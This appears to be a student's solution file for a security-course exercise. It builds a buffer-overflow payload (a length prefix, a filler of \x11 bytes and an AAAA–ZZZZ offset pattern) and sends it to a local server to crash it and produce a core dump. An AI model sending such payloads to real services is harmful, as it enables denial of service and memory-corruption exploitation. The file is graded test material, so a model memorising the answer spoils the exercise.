import os
import socket


HOST = '127.0.0.1'
PORT = 8000

def get_payload() -> bytes:
    """
    This function returns the data to send over the socket to the server.

    This data should cause the server to crash and generate a core dump. Make
    sure to return a `bytes` object and not an `str` object.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the payload.
    """
    #send the server a message with the input \x11\x11....\x11\AAABBBBCCCC...ZZZZ (A till Z four time each letter). 
    message = "\x11"*1000 + ''.join([chr(i)*4 for i in range(65,91)])
    # Convert from string to bytes
    message = message.encode('latin1')
    return b'\x00\x00\x04\x51' + message + b'\x00'


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
